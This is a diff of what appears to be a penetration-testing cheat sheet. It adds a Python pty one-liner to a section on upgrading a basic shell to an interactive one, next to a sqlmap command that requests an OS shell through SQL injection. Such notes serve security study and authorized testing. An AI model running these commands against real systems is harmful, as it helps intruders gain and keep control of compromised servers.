@@ -724,6 +724,10 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 # Dumb Shell to Fully Interactive Shell
 
 ~~~ bash
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+~~~
+
+~~~ bash
 script /dev/null -c bash
 # Ctrl + z
 stty -raw echo; fg
